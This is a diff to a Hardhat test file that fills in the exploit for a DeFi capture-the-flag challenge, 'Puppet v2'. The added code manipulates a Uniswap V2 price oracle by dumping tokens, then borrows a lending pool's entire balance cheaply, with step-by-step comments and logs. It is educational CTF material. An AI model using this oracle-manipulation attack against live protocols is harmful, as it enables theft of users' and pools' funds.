@@ -81,7 +81,55 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //As in previous challenge, we are interacting with Uniswap protocol as an oracle to get price to borrow tokens from a pool. In this case, it's V2. 
+        //We as attacker also have higher quantities from both tokens: DVT and WETH, in this case.  
+        //The attack will be the following: we'll swap with the protocol our DVT tokens for WETH, in order to devaluate price per unit, modify both reserves amount,
+        //and trick how pool is getting price. If it goes well, our move will affect the calculation of WETH deposit required to borrow all tokens from pool. 
+
+        console.log("How much WETH costs to borrow all tokens from pool right now?")
+        let wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log(ethers.utils.formatEther(wethRequired), "WETH")
+        console.log("Let's trick deposit calculation swapping..")
+              
+        const wethAmountOut = await this.uniswapRouter.connect(attacker).getAmountOut(ATTACKER_INITIAL_TOKEN_BALANCE,
+        UNISWAP_INITIAL_TOKEN_RESERVE,
+        UNISWAP_INITIAL_WETH_RESERVE)
+        console.log("Max amount of WETH we'll receive for our 10000 DVT tokens from Uniswap exchange:", ethers.utils.formatEther(wethAmountOut))
+
+
+        //Approve the router to spend our DVT tokens. Swap all our DVT for WETH.
+        await this.token.connect(attacker).approve( this.uniswapRouter.address ,ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethers.utils.parseEther('9'),
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        )
+        console.log("Swap done!")
+        console.log("How much WETH costs to borrow all tokens from pool after swap?")
+        wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log(ethers.utils.formatEther(wethRequired), "WETH")
+
+        console.log("Attacker DVT token balance:", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
+        console.log("Attacker WETH balance:", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)))
+        console.log("Attacker ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)))
+        console.log("Let's convert our ETH to WETH..")
+        
+        //Transfer ETH to WETH to surpass the amount required. 
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther("19.9") })
+        console.log("Updated attacker WETH balance:", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)))
+
+        //Approve the lending pool to spend our WETH. Borrow DVT tokens from pool. 
+        const wethToSpend = await this.weth.balanceOf(attacker.address)
+        await this.weth.connect(attacker).approve( this.lendingPool.address, wethToSpend)
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+        
+        console.log("Borrow done! Let's check pool's and all our balances")
+        console.log("Lending pool token balance:", ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address)))
+        console.log("Attacker DVT token balance:", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
+        console.log("Attacker WETH balance:", ethers.utils.formatEther(await this.weth.balanceOf(attacker.address)))
+        console.log("Attacker ETH balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)))
     });
 
     after(async function () {
